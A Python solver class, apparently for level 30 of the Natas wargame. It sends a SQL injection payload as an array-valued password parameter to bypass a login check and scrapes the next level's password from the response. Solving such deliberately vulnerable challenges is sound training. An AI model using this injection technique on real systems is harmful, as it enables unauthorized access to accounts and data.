import re
from .base_solver import NatasSolver

class Natas30Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Make request with SQL injection via array parameter
            response = self.make_request(
                method="POST",
                data={
                    "username": "natas31",
                    "password": ["'anything' or 1", 2]  # Array parameter to bypass check
                }
            )
            
            # Extract password using regex
            match = re.findall(r"<br>natas31(.*)<div", response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas30: {str(e)}")